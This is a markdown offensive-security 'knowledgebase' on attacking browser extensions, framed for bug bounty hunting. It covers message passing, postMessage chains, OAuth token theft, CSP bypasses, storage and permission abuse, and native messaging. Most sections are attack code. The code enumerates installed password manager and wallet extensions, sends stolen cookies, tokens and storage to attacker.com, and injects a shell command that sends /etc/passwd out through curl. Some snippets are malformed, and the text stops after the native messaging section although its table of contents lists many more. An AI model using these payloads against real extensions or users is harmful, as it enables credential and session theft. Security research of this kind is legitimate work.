# Browser Extension Attacks - Comprehensive Knowledgebase

> **Research-grade knowledgebase for advanced bug bounty hunting and black-box testing**
> **Compiled from PortSwigger Research, Chrome/Mozilla Docs, GitHub Repositories, and Community Research**
> **Version: 2026.05 | Classification: Advanced Exploitation Techniques**

---

## Table of Contents

1. [Basics](#basics)
2. [Browser Extension Theory](#browser-extension-theory)
3. [Extension Architecture Internals](#extension-architecture-internals)
4. [Extension Message Passing Abuse](#extension-message-passing-abuse)
5. [postMessage + Extension Chains](#postmessage--extension-chains)
6. [Extension OAuth Token Theft](#extension-oauth-token-theft)
7. [Extension CSP Bypasses](#extension-csp-bypasses)
8. [Extension Storage Abuse](#extension-storage-abuse)
9. [Extension Permission Abuse](#extension-permission-abuse)
10. [Native Messaging Abuse](#native-messaging-abuse)
11. [Content Script Injection Chains](#content-script-injection-chains)
12. [Service Worker + Extension Chains](#service-worker--extension-chains)
13. [Cache Poisoning + Extension Chains](#cache-poisoning--extension-chains)
14. [Request Smuggling + Extension Chains](#request-smuggling--extension-chains)
15. [Parser Confusion Payloads](#parser-confusion-payloads)
16. [Browser Quirks](#browser-quirks)
17. [Gadget Chains](#gadget-chains)
18. [Real World Case Studies](#real-world-case-studies)
19. [Fuzzing Payloads](#fuzzing-payloads)
20. [Automation Workflows](#automation-workflows)
21. [Recon Methodology](#recon-methodology)
22. [Nuclei Templates](#nuclei-templates)
23. [Tools and Scanners](#tools-and-scanners)
24. [Advanced Research](#advanced-research)
25. [Bug Bounty Writeups](#bug-bounty-writeups)
26. [Payload Collections](#payload-collections)
27. [WAF Bypasses](#waf-bypasses)
28. [Detection Techniques](#detection-techniques)
29. [References](#references)

---

## Basics

### What Are Browser Extensions?

Browser extensions are small software programs that customize the browsing experience. They enable users to tailor browser functionality and behavior to individual needs or preferences. Extensions are built on web technologies (HTML, CSS, JavaScript) and can interact with web pages, browser APIs, and external services.

### Extension Manifest Versions

| Version | Status | Key Characteristics |
|---------|--------|---------------------|
| MV2 (Manifest V2) | Deprecated | Background pages, broader API access, more permissive |
| MV3 (Manifest V3) | Current | Service workers, limited API access, stricter CSP, declarative APIs |

### Core Security Boundaries

Extensions operate under a privilege escalation model where content scripts run in a partially-privileged context (can read DOM but limited API access), while background/service workers run in a fully-privileged context (full API access but isolated from web pages).

**Critical Insight**: The bridge between these contexts (`chrome.runtime.sendMessage`) is the primary target for exploitation. If an attacker can inject messages into this bridge, they can escalate from web page context to extension context.

### Extension Attack Surface Overview

The primary attack vectors against browser extensions include:

1. **Message Passing Abuse**: Exploiting `chrome.runtime.sendMessage` / `chrome.runtime.onMessage`
2. **postMessage Hijacking**: Intercepting or spoofing cross-origin messages
3. **Content Script Injection**: XSS via content script execution contexts
4. **Permission Escalation**: Abusing declared permissions beyond intended scope
5. **Storage Exfiltration**: Reading sensitive data from `chrome.storage` or `localStorage`
6. **Native Messaging**: Exploiting communication with host binaries
7. **OAuth Flow Interception**: Stealing tokens during authentication flows
8. **CSP Bypasses**: Circumventing extension Content Security Policy
9. **Request Smuggling via Extensions**: Using extension requests to desynchronize servers
10. **Cache Poisoning**: Poisoning extension resource caches

---

## Browser Extension Theory

### The Extension Security Model

Extensions operate under a **privilege escalation model** where content scripts run in a partially-privileged context (can read DOM but limited API access), while background/service workers run in a fully-privileged context (full API access but isolated from web pages).

**Critical Insight**: The bridge between these contexts (`chrome.runtime.sendMessage`) is the primary target for exploitation. If an attacker can inject messages into this bridge, they can escalate from web page context to extension context.

### Same-Origin Policy (SOP) and Extensions

Extensions have unique SOP rules:
- Content scripts can access DOM of any page they are injected into
- Content scripts cannot directly access JavaScript variables from the page
- Background scripts can make cross-origin requests (if `permissions` include the host)
- `chrome-extension://` URIs have their own origin

### Extension Isolation Levels

```javascript
// Content Script Isolation Example
// Content script CAN read DOM:
const pageTitle = document.title;

// Content script CANNOT read page JS variables directly:
// window.secretVariable is undefined in content script context

// But CAN inject scripts into page context:
const script = document.createElement('script');
script.textContent = `console.log(window.secretVariable)`;
document.documentElement.appendChild(script);
```

### Extension Update Mechanism Attacks

Extensions auto-update from Chrome Web Store or Mozilla Add-ons. Attack vectors:
- **Compromised Developer Account**: Attacker pushes malicious update
- **Extension Transfer**: Popular extension sold to malicious actor
- **Dependency Confusion**: Malicious dependencies in extension build chain
- **Store Policy Bypass**: Obfuscated malicious code passes review

---

## Extension Architecture Internals

### Manifest Structure (MV3)

```json
{
  "manifest_version": 3,
  "name": "Example Extension",
  "version": "1.0",
  "permissions": [
    "storage",
    "activeTab",
    "scripting",
    "webRequest",
    "cookies"
  ],
  "host_permissions": [
    "<all_urls>",
    "https://*.example.com/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_end",
      "all_frames": true
    }
  ],
  "web_accessible_resources": [
    {
      "resources": ["injected.js"],
      "matches": ["<all_urls>"]
    }
  ],
  "externally_connectable": {
    "matches": ["https://*.example.com/*"]
  }
}
```

### Key Architecture Components

#### 1. Service Worker (Background Script)

```javascript
// background.js - Service Worker in MV3
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  // This listener is a CRITICAL attack surface
  // If it doesn't validate sender.origin or sender.url, it's vulnerable

  if (request.action === "fetchData") {
    // Dangerous: No origin validation
    fetch(request.url)
      .then(response => response.json())
      .then(data => sendResponse({data: data}));
    return true; // Async response
  }

  if (request.action === "getCookies") {
    // EXTREMELY Dangerous: Exposing cookies to any caller
    chrome.cookies.getAll({domain: request.domain}).then(sendResponse);
    return true;
  }
});
```

#### 2. Content Scripts

```javascript
// content.js - Runs in page context but isolated world
// Can communicate with background via chrome.runtime.sendMessage

// Vulnerable pattern: Relaying messages without validation
window.addEventListener('message', (event) => {
  // DANGEROUS: No origin check on postMessage
  if (event.data.type === 'EXT_REQUEST') {
    chrome.runtime.sendMessage(event.data.payload, (response) => {
      event.source.postMessage({type: 'EXT_RESPONSE', data: response}, '*');
    });
  }
});
```

#### 3. Popup/Options Pages

```javascript
// popup.js - Runs when extension icon is clicked
// Has access to chrome APIs but limited DOM access

document.getElementById('saveToken').addEventListener('click', () => {
  const token = document.getElementById('token').value;
  // Storing sensitive data - attack target
  chrome.storage.local.set({authToken: token});
});
```

### Message Passing Flow

```
Web Page --postMessage--> Content Script --chrome.runtime.sendMessage--> Background Script
    |                         |                                           |
    |                         | (isolated world)                          | (privileged)
    |                         |                                           |
    |<--postMessage-----------|<--chrome.runtime.sendMessage-------------|
```

### Critical Internal APIs

| API | Risk Level | Abuse Potential |
|-----|-----------|-----------------|
| `chrome.runtime.sendMessage` | CRITICAL | Universal message injection |
| `chrome.runtime.onMessage` | CRITICAL | Message interception/handling |
| `chrome.tabs.executeScript` | HIGH | Arbitrary script injection |
| `chrome.cookies.getAll` | CRITICAL | Session hijacking |
| `chrome.storage.local` | HIGH | Data exfiltration |
| `chrome.webRequest` | HIGH | Request interception/modification |
| `chrome.downloads` | MEDIUM | Malware delivery |
| `chrome.permissions.request` | HIGH | Permission escalation |

---

## Extension Message Passing Abuse

### The Core Vulnerability Pattern

The most common and dangerous vulnerability in browser extensions is **insecure message passing**. When a background script or content script handles messages without validating the sender, any web page (or malicious extension) can send commands.

### Vulnerable Message Handler Patterns

```javascript
// ================================================================
// PATTERN 1: No Sender Validation (CRITICAL)
// ================================================================
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  // VULNERABLE: No check on sender.origin or sender.url
  if (request.action === "getAuthToken") {
    chrome.storage.local.get("authToken").then(sendResponse);
    return true;
  }
});

// EXPLOITATION: Any web page can call this
// From attacker.com:
chrome.runtime.sendMessage(EXT_ID, {action: "getAuthToken"}, console.log);
```

```javascript
// ================================================================
// PATTERN 2: Weak Origin Validation (HIGH)
// ================================================================
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  // WEAK: String comparison can be bypassed
  if (sender.url.includes("example.com")) {
    // Attacker can use attacker-example.com or example.com.attacker.com
    performPrivilegedAction(request);
  }
});

// BYPASS PAYLOADS:
// https://evil-example.com/
// https://example.com.evil.com/
// https://sub.example.com.evil.com/
```

```javascript
// ================================================================
// PATTERN 3: Missing Action Validation (HIGH)
// ================================================================
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (sender.origin === "https://trusted.com") {
    // VULNERABLE: Any action is allowed from trusted origin
    // But what if trusted.com has XSS?
    eval(request.code); // RCE via XSS on trusted.com
  }
});
```

### Message Passing Attack Payloads

```javascript
// ================================================================
// PAYLOAD 1: Direct Message Injection to Extension
// ================================================================

// Step 1: Enumerate installed extensions (Chrome)
const extensions = [];
const knownExtensions = {
  'nkbihfbeogaeaoehlefnkodbefgpgknn': 'MetaMask',
  'ejbalbakoplchlghecdalmeeeajnimhm': 'Phantom',
  'bfnaelmomeimhlpmgjnjophhpkkoljpa': '1Password',
  'fdjamakpfbbddfjaooajfalefpgkmlfo': 'Bitwarden',
  'hdokiejnpimakedhajhdlblgejjryckj': 'LastPass',
  'dbepggeogbaibhgnhhndojpepiihcmeb': 'Keeper',
  'imheepoocgiipljchpmhdhaimlgjmcbm': 'Dashlane',
  'fngmhnnpilhplakakhiehpjlijbhmngh': 'NordPass',
  'bkhpgcmmnpbncdjgphlglidemmjbkgbl': 'Authy',
  'gaedmjdfmmahhbjflckfbedjjbdkjaij': 'Google Authenticator',
  'mihdfbecejheednfigbpmocgncnflagh': 'Honey',
  'lghgdplbpbcklndbjbglmfenihfjbmgn': 'Grammarly',
  'gcbommkclmclpchllfjekcdkpbjddhjm': 'uBlock Origin',
  'pkehgijcmpdhfbdbbnkijodmijkbtrdg': 'Privacy Badger',
  'nngceckbapebfimnlniiiahkandclblb': 'Bitwarden (alt)',
  'apdfllckaahabafndbhieahigkjlhalf': 'Google Drive',
  'gbchcmhmhahfdphkhkmpfmihenigjmpp': 'Chrome Remote Desktop',
  'coobgpohoikkiipiblmjeljniedjfikd': 'Google Calendar',
  'lneaknkopdijkpnycmfgbbfgfjgfaodg': 'Slack',
  'jeogkiiogjbmhmlabbfjlabbpcnppfcg': 'Discord',
  'clhhggbfdinjkjdffdmmjgehdephmdlf': 'WhatsApp',
  'pgphnlopbfbfdkbmmklddjmibnncnohh': 'Twitter',
  'odlpjhnipdekfkdkameofobdmkcfleln': 'LinkedIn',
  'kohkgbebdchaogdbkhgmioefjcbpfjpe': 'Reddit',
  'eimadpbcbfnmbkopoojfekhnkhdbieeh': 'Dark Reader'
};

// Enumerate by attempting to load extension pages
async function enumerateExtensions() {
  for (const [id, name] of Object.entries(knownExtensions)) {
    try {
      const response = await fetch(`chrome-extension://${id}/manifest.json`, {
        mode: 'no-cors'
      });
      if (response.status === 200) {
        extensions.push({id, name});
      }
    } catch (e) {
      // Extension not installed or blocked
    }
  }
  return extensions;
}
```

```javascript
// ================================================================
// PAYLOAD 2: Message Interception and Modification
// ================================================================

// Intercept messages between content script and background
const originalSendMessage = chrome.runtime.sendMessage;
chrome.runtime.sendMessage = function(...args) {
  console.log('[INTERCEPTED]', args);
  // Modify the message before forwarding
  if (args[0] && args[0].action === "getUserData") {
    args[0].action = "getAdminData"; // Privilege escalation
  }
  return originalSendMessage.apply(this, args);
};
```

```javascript
// ================================================================
// PAYLOAD 3: Message Replay Attack
// ================================================================

// Capture legitimate messages and replay them
const messageLog = [];
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  messageLog.push({request, sender, timestamp: Date.now()});
});

// Replay after 24 hours when session might be more valuable
setTimeout(() => {
  messageLog.forEach(msg => {
    chrome.runtime.sendMessage(msg.request);
  });
}, 86400000);
```

### External Message Abuse (`externally_connectable`)

```javascript
// ================================================================
// PAYLOAD 4: externally_connectable Abuse
// ================================================================

// If manifest declares externally_connectable with broad patterns:
// "externally_connectable": {
//   "matches": ["https://*.example.com/*"]
// }

// Attacker controls sub.example.com or finds XSS on any matching domain
// Can send messages directly to extension:

// From attacker-controlled page:
chrome.runtime.sendMessage(EXT_ID, {
  action: "authenticate",
  token: "stolen_token"
}, (response) => {
  // Handle response
});

// BYPASS: If pattern is "https://*.example.com/*"
// Register attacker-example.com (wildcard match)
// Or use https://example.com.attacker.com/ (subdomain bypass)
```

### Message Passing Fuzzing Patterns

```javascript
// ================================================================
// FUZZING PAYLOADS FOR MESSAGE HANDLERS
// ================================================================

const fuzzPayloads = [
  // Type confusion
  {action: null},
  {action: undefined},
  {action: 12345},
  {action: true},
  {action: []},
  {action: {}},

  // Prototype pollution attempts
  {action: "getData", "__proto__": {admin: true}},
  {action: "getData", "constructor": {prototype: {admin: true}}},

  // Large payloads
  {action: "getData", data: "A".repeat(10000000)},

  // Circular references
  (() => {
    const obj = {action: "getData"};
    obj.self = obj;
    return obj;
  })(),

  // Special characters in strings
  {action: "getData
\x00\x01\x02"},
  {action: "getData", url: "javascript:alert(1)"},

  // Array vs Object confusion
  {action: ["getData", "deleteData"]},

  // Nested depth attacks
  {action: "getData", nested: {a: {b: {c: {d: {e: "deep"}}}}}},

  // Unicode and encoding tricks
  {action: "getData\x00", unicode: "  "},

  // SQL/NoSQL injection via messages
  {action: "search", query: "{$ne: null}"},
  {action: "search", query: "' OR '1'='1"},
];

// Automated fuzzer
async function fuzzExtension(extId, payloads) {
  const results = [];
  for (const payload of payloads) {
    try {
      const result = await new Promise((resolve) => {
        chrome.runtime.sendMessage(extId, payload, (response) => {
          resolve({
            payload: JSON.stringify(payload).substring(0, 100),
            response: response,
            error: chrome.runtime.lastError
          });
        });
      });
      results.push(result);
    } catch (e) {
      results.push({payload, error: e.message});
    }
  }
  return results;
}
```

---

## postMessage + Extension Chains

### The postMessage to Extension Bridge

When extensions use `postMessage` to communicate with web pages, they create a bridge that attackers can exploit. The typical vulnerable pattern:

```javascript
// VULNERABLE CONTENT SCRIPT
window.addEventListener('message', (event) => {
  // DANGEROUS: No origin validation
  if (event.data.type === 'FROM_PAGE') {
    // Relay to background script without validation
    chrome.runtime.sendMessage(event.data.payload);
  }

  // DANGEROUS: Origin check using includes()
  if (event.origin.includes('trusted.com')) {
    chrome.runtime.sendMessage(event.data);
  }
});
```

### postMessage Origin Validation Bypasses

```javascript
// ================================================================
// BYPASS 1: Subdomain Injection
// ================================================================
// If check is: event.origin.includes('example.com')
// Host attacker page at: https://example.com.attacker.com/

// ================================================================
// BYPASS 2: Null Origin
// ================================================================
// Open target in sandboxed iframe or from file://
// postMessage from null origin
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    parent.postMessage({type: 'FROM_PAGE', payload: 'evil'}, '*');
  </script>
"></iframe>

// ================================================================
// BYPASS 3: Protocol-relative URL
// ================================================================
// If check uses startsWith('https://')
// Use data:text/html, or javascript: to bypass

// ================================================================
// BYPASS 4: Unicode Homoglyphs
// ================================================================
// Use Unicode characters that look like ASCII
// example.com (Cyrillic 'e' instead of Latin 'e')

// ================================================================
// BYPASS 5: Origin Spoofing via document.domain
// ================================================================
// If both pages set document.domain = 'example.com'
// They can communicate despite different origins
// But this is deprecated and being removed
```

### Complete postMessage to Extension Exploitation Chain

```javascript
// ================================================================
// FULL EXPLOITATION CHAIN: postMessage -> Content Script -> Background
// ================================================================

// STEP 1: Find a page that loads the extension's content script
// Look for pages matching the extension's "matches" pattern

// STEP 2: Inject a malicious iframe or open a window
const exploitWindow = window.open('https://victim.com/page-with-extension', '_blank');

// STEP 3: After page loads, send postMessage to content script
setTimeout(() => {
  exploitWindow.postMessage({
    type: 'EXT_REQUEST',
    payload: {
      action: 'getAllCookies',
      domain: '.victim.com'
    }
  }, '*'); // Wildcard target - content script will receive it
}, 2000);

// STEP 4: Listen for response
window.addEventListener('message', (event) => {
  if (event.data.type === 'EXT_RESPONSE') {
    console.log('Stolen data:', event.data.data);
    // Exfiltrate to attacker server
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify(event.data.data)
    });
  }
});
```

### Advanced postMessage Gadgets

```javascript
// ================================================================
// GADGET 1: postMessage + Prototype Pollution -> Extension RCE
// ================================================================

// If content script does: Object.assign(config, event.data.config)
// And background script uses config values:

// Pollute prototype to inject malicious handler
window.postMessage({
  type: 'UPDATE_CONFIG',
  config: {
    "__proto__": {
      "onUpdate": "fetch('https://attacker.com/?c='+document.cookie)"
    }
  }
}, '*');

// ================================================================
// GADGET 2: postMessage + DOM Clobbering -> Extension Bypass
// ================================================================

// If extension checks: if (window.allowedDomains.includes(origin))
// DOM Clobber to override allowedDomains:
document.body.innerHTML += '<a id="allowedDomains"></a>';
// Now window.allowedDomains is an HTMLAnchorElement
// .includes() will throw or return unexpected results

// ================================================================
// GADGET 3: postMessage + JSON.parse -> Prototype Pollution
// ================================================================

// If content script does: const data = JSON.parse(event.data);
// And later: if (data.settings.admin) { ... }

// Send polluted JSON:
window.postMessage('{"settings": {"admin": true}, "__proto__": {"admin": true}}', '*');
```

---

## Extension OAuth Token Theft

### OAuth Flow Interception

Extensions often handle OAuth flows for authentication. The typical flow:

```
1. Extension opens: https://provider.com/oauth/authorize?client_id=...&redirect_uri=chrome-extension://ID/callback
2. User authenticates
3. Provider redirects to: chrome-extension://ID/callback?code=AUTH_CODE
4. Extension exchanges code for token
```

### Attack Vectors

```javascript
// ================================================================
// ATTACK 1: Redirect URI Hijacking
// ================================================================

// If extension uses broad redirect_uri pattern:
// redirect_uri=chrome-extension://ID/*
// Or if provider allows any chrome-extension:// redirect

// Attacker extension can intercept the OAuth callback:
// Attacker extension manifest:
{
  "manifest_version": 3,
  "name": "Fake Extension",
  "permissions": ["webNavigation"],
  "background": {
    "service_worker": "background.js"
  }
}

// background.js:
chrome.webNavigation.onBeforeNavigate.addListener((details) => {
  if (details.url.includes('chrome-extension://VICTIM_ID/callback')) {
    // Intercept the OAuth callback with auth code
    const url = new URL(details.url);
    const code = url.searchParams.get('code');
    // Steal the code and complete OAuth flow
    fetch('https://attacker.com/steal?code=' + code);
  }
});

// ================================================================
// ATTACK 2: Tab Hijacking During OAuth Flow
// ================================================================

// If extension opens OAuth in current tab instead of new window:
chrome.tabs.update({url: 'https://provider.com/oauth/authorize?...'});

// Attacker can navigate the tab away before callback:
// Via XSS on provider domain, or via compromised extension

// ================================================================
// ATTACK 3: postMessage Token Extraction
// ================================================================

// If extension's OAuth callback page uses postMessage:
// callback.html:
window.addEventListener('message', (event) => {
  if (event.data.type === 'GET_TOKEN') {
    event.source.postMessage({type: 'TOKEN', token: localStorage.getItem('token')}, '*');
  }
});

// Attacker iframe:
const iframe = document.createElement('iframe');
iframe.src = 'chrome-extension://VICTIM_ID/callback.html';
document.body.appendChild(iframe);

setTimeout(() => {
  iframe.contentWindow.postMessage({type: 'GET_TOKEN'}, '*');
}, 1000);

window.addEventListener('message', (event) => {
  if (event.data.type === 'TOKEN') {
    console.log('Stolen token:', event.data.token);
  }
});

// ================================================================
// ATTACK 4: Storage API Token Theft
// ================================================================

// If extension stores tokens in chrome.storage without encryption:
// And has a vulnerable message handler:
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "getToken") {
    // VULNERABLE: No sender validation
    chrome.storage.local.get("oauth_token").then(sendResponse);
    return true;
  }
});

// Any web page can call:
chrome.runtime.sendMessage(EXT_ID, {action: "getToken"}, console.log);
```

### OAuth Token Theft via Request Smuggling

```javascript
// ================================================================
// ATTACK 5: Request Smuggling -> OAuth Callback Interception
// ================================================================

// If OAuth provider is behind a vulnerable reverse proxy:
// Use request smuggling to intercept the callback

// Desync attack to steal OAuth callback:
POST /oauth/callback HTTP/1.1
Host: provider.com
Content-Length: 5
Transfer-Encoding: chunked

0

GET /steal?code= HTTP/1.1
Host: attacker.com

// The smuggled request will capture the callback parameters
```

---

## Extension CSP Bypasses

### Understanding Extension CSP

MV3 extensions have a strict default CSP:
```
default-src 'self'; script-src 'self'; object-src 'none'
```

This prevents inline scripts and external resource loading. However, there are bypass techniques:

### CSP Bypass Techniques

```javascript
// ================================================================
// BYPASS 1: web_accessible_resources + JSONP
// ================================================================

// If extension exposes scripts as web_accessible_resources:
// "web_accessible_resources": [{
//   "resources": ["inject.js"],
//   "matches": ["<all_urls>"]
// }]

// Attacker can load the script and use its functions:
const script = document.createElement('script');
script.src = 'chrome-extension://ID/inject.js';
script.onload = () => {
  // If inject.js exposes privileged functions globally:
  window.extensionAPI.getToken().then(console.log);
};
document.head.appendChild(script);

// ================================================================
// BYPASS 2: Eval via chrome.tabs.executeScript
// ================================================================

// If extension has "scripting" permission and vulnerable handler:
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "execute") {
    chrome.scripting.executeScript({
      target: {tabId: sender.tab.id},
      func: new Function(request.code) // BYPASS: Function constructor
    });
  }
});

// Attacker sends:
chrome.runtime.sendMessage(EXT_ID, {
  action: "execute",
  code: "fetch('https://attacker.com/?c='+document.cookie)"
});

// ================================================================
// BYPASS 3: CSS Injection -> Data Exfiltration
// ================================================================

// If extension allows CSS injection but blocks JS:
// Use CSS to exfiltrate data via attribute selectors

const css = `
  input[type="password"][value^="a"] { background: url(https://attacker.com/a); }
  input[type="password"][value^="b"] { background: url(https://attacker.com/b); }
  // ... etc for all characters
`;

chrome.runtime.sendMessage(EXT_ID, {
  action: "injectCSS",
  css: css
});

// ================================================================
// BYPASS 4: SVG + ForeignObject + JavaScript
// ================================================================

// If extension allows SVG but blocks JS:
// SVG can contain foreignObject with HTML and script
const svgPayload = `
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert('CSP Bypassed')</script>
    </body>
  </foreignObject>
</svg>
`;

// ================================================================
// BYPASS 5: WebAssembly + Eval Equivalent
// ================================================================

// If extension allows WASM but blocks eval:
// Compile WASM that performs equivalent of eval
const wasmCode = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
  // ... WASM that calls imported JS functions
]);

WebAssembly.instantiate(wasmCode, {
  env: {
    exec: (ptr) => {
      // Execute arbitrary code via imported function
      new Function(ptr)();
    }
  }
});

// ================================================================
// BYPASS 6: chrome.runtime.getURL + iframe sandbox
// ================================================================

// If extension has lax CSP and exposes pages:
// Use chrome-extension:// URL in sandboxed iframe
const iframe = document.createElement('iframe');
iframe.sandbox = 'allow-scripts allow-same-origin';
iframe.src = 'chrome-extension://ID/page.html?xss=<script>alert(1)</script>';
document.body.appendChild(iframe);
```

### CSP Bypass via Prototype Pollution

```javascript
// If extension uses DOMPurify or similar with CSP:
// Pollute prototype to disable sanitization

// Payload:
?__proto__[ALLOWED_ATTR][0]=onerror
&__proto__[ALLOWED_ATTR][1]=src

// Result: DOMPurify allows onerror and src attributes
// Bypassing CSP restrictions on inline event handlers
```

---

## Extension Storage Abuse

### Storage APIs

Extensions use multiple storage mechanisms:
- `chrome.storage.local` - Persistent, unencrypted
- `chrome.storage.session` - Session-only (MV3)
- `chrome.storage.sync` - Synced across devices
- `localStorage` / `sessionStorage` - Standard web storage
- IndexedDB - Structured data

### Storage Exfiltration Techniques

```javascript
// ================================================================
// TECHNIQUE 1: Direct Storage API Access via Messages
// ================================================================

// Vulnerable handler:
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "getStorage") {
    chrome.storage.local.get(null).then(sendResponse); // Returns ALL data
    return true;
  }
});

// Exploit:
chrome.runtime.sendMessage(EXT_ID, {action: "getStorage"}, (data) => {
  // data contains all stored credentials, tokens, settings
  fetch('https://attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});

// ================================================================
// TECHNIQUE 2: Storage Key Enumeration
// ================================================================

// If extension doesn't return all keys, enumerate them:
const commonKeys = [
  'token', 'auth', 'password', 'secret', 'key', 'credential',
  'session', 'cookie', 'oauth', 'api_key', 'private_key',
  'user', 'account', 'login', 'email', 'config', 'settings'
];

async function enumerateStorage(extId) {
  const results = {};
  for (const key of commonKeys) {
    const result = await new Promise(resolve => {
      chrome.runtime.sendMessage(extId, {
        action: "getStorage",
        key: key
      }, resolve);
    });
    if (result && Object.keys(result).length > 0) {
      results[key] = result;
    }
  }
  return results;
}

// ================================================================
// TECHNIQUE 3: Storage Poisoning
// ================================================================

// If extension uses storage for configuration:
// Poison storage to change extension behavior

chrome.runtime.sendMessage(EXT_ID, {
  action: "setStorage",
  key: "config",
  value: {
    "proxy": "https://attacker.com",
    "logging": true,
    "debug": true
  }
});

// ================================================================
// TECHNIQUE 4: Cross-Origin Storage via Content Script
// ================================================================

// Content script can access page's localStorage:
// If content script is injected into attacker.com:
const pageStorage = {
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage),
  cookies: document.cookie
};

// Send to attacker
chrome.runtime.sendMessage({action: "exfil", data: pageStorage});
```

### Storage Data at Rest Exploitation

```javascript
// ================================================================
// ATTACK: Decrypting Extension Storage
// ================================================================

// If extension encrypts storage but key is in extension code:
// Extract key from extension source:
fetch('chrome-extension://ID/background.js')
  .then(r => r.text())
  .then(code => {
    // Search for encryption keys, API keys, secrets
    const keyMatch = code.match(/const\s+KEY\s*=\s*["']([^"']+)["']/);
    if (keyMatch) {
      console.log('Found key:', keyMatch[1]);
    }
  });

// ================================================================
// ATTACK: Extension Source Code Analysis
// ================================================================

// Download entire extension source:
async function downloadExtensionSource(extId) {
  const baseUrl = `chrome-extension://${extId}/`;
  const manifest = await fetch(baseUrl + 'manifest.json').then(r => r.json());

  const files = [];
  // Collect all JS files from manifest
  if (manifest.background) {
    files.push(...(manifest.background.scripts || []));
    if (manifest.background.service_worker) {
      files.push(manifest.background.service_worker);
    }
  }
  if (manifest.content_scripts) {
    manifest.content_scripts.forEach(cs => {
      files.push(...(cs.js || []));
    });
  }

  // Download and analyze each file
  const sources = {};
  for (const file of files) {
    sources[file] = await fetch(baseUrl + file).then(r => r.text());
  }

  return sources;
}
```

---

## Extension Permission Abuse

### Dangerous Permissions

| Permission | Abuse Potential | Common Exploits |
|-----------|-----------------|-----------------|
| `<all_urls>` | CRITICAL | Universal request interception, cookie theft |
| `webRequest` | CRITICAL | Request/response modification, MITM |
| `webRequestBlocking` | CRITICAL | Blocking and modifying all traffic |
| `cookies` | CRITICAL | Session hijacking, credential theft |
| `storage` | HIGH | Data exfiltration, configuration poisoning |
| `tabs` | HIGH | Tab hijacking, URL manipulation |
| `activeTab` | MEDIUM | Temporary access to current page |
| `scripting` | HIGH | Arbitrary script injection |
| `downloads` | MEDIUM | Malware delivery |
| `history` | MEDIUM | Browsing history exfiltration |
| `bookmarks` | LOW | Data theft |
| `notifications` | LOW | Social engineering |
| `clipboardRead` | HIGH | Clipboard data theft |
| `clipboardWrite` | MEDIUM | Clipboard poisoning |
| `desktopCapture` | CRITICAL | Screen recording |
| `pageCapture` | HIGH | Screenshot capture |
| `proxy` | CRITICAL | Traffic interception |
| `dns` | MEDIUM | DNS hijacking |
| `nativeMessaging` | CRITICAL | Host system compromise |

### Permission Escalation Chains

```javascript
// ================================================================
// CHAIN 1: activeTab -> tabs -> scripting -> Full Compromise
// ================================================================

// Step 1: User clicks extension icon (grants activeTab)
chrome.action.onClicked.addListener(async (tab) => {
  // Step 2: Use activeTab to inject script that requests more permissions
  await chrome.scripting.executeScript({
    target: {tabId: tab.id},
    func: () => {
      // Step 3: In page context, trigger permission request
      chrome.permissions.request({
        permissions: ['cookies', 'webRequest', '<all_urls>']
      });
    }
  });
});

// ================================================================
// CHAIN 2: storage -> cookies -> Session Hijacking
// ================================================================

// If extension has storage but not cookies:
// Use content script to read page cookies and store them
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "harvest") {
    // Content script has access to document.cookie
    const cookies = document.cookie;
    // Store in extension storage
    chrome.storage.local.set({[`cookies_${Date.now()}`]: cookies});
  }
});

// ================================================================
// CHAIN 3: webRequest -> Request Modification -> Account Takeover
// ================================================================

// If extension has webRequest permission:
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    // Modify requests to add attacker-controlled parameters
    if (details.url.includes('api.example.com')) {
      return {
        redirectUrl: details.url.replace('api.example.com', 'attacker.com')
      };
    }
  },
  {urls: ["<all_urls>"]},
  ["blocking"]
);
```

### Permission Request Hijacking

```javascript
// ================================================================
// ATTACK: Spoofing Permission Requests
// ================================================================

// If extension dynamically requests permissions:
// Trigger the request from attacker-controlled context

// From attacker.com:
// Open extension page in popup
const popup = window.open('chrome-extension://ID/options.html', '_blank');

// After load, trigger permission request via postMessage
setTimeout(() => {
  popup.postMessage({action: "requestPerms", perms: ['cookies']}, '*');
}, 1000);

// User sees permission prompt from "trusted" extension
// But it's actually triggered by attacker
```

---

## Native Messaging Abuse

### Native Messaging Architecture

```
Extension (JS) <--stdio--> Native Host (Binary) <---> OS/System
                    JSON messages              Any protocol
```

### Native Messaging Attack Vectors

```javascript
// ================================================================
// ATTACK 1: Native Host Command Injection
// ================================================================

// If native host passes message data to shell commands:
// Vulnerable native host (Python example):
/*
import subprocess, json, sys

message = json.loads(sys.stdin.readline())
# VULNERABLE: Direct command execution
cmd = message.get('command')
subprocess.run(cmd, shell=True)
*/

// Extension sends:
chrome.runtime.sendNativeMessage('com.company.host', {
  command: "calc.exe; curl https://attacker.com/exfil?data=$(cat /etc/passwd)"
});

// ================================================================
// ATTACK 2: Native Host Path Traversal
// ================================================================

// If native host reads files based on message input:
/*
filename = message.get('file')
with open(f'/safe/dir/{filename}') as f:
    return f.read()
*/

// Send:
{
  "file": "../../../etc/passwd"
}

// ================================================================
// ATTACK 3: Native Host Binary Replacement
// ================================================================

// If native host binary is not protected:
// Replace with malicious binary at:
// Windows: %LOCALAPPDATA%\com.company.host\host.exe
// macOS: ~/Library/Application Support/com.company.host/host
// Linux: ~/.config/com.company.host/host

// ================================================================
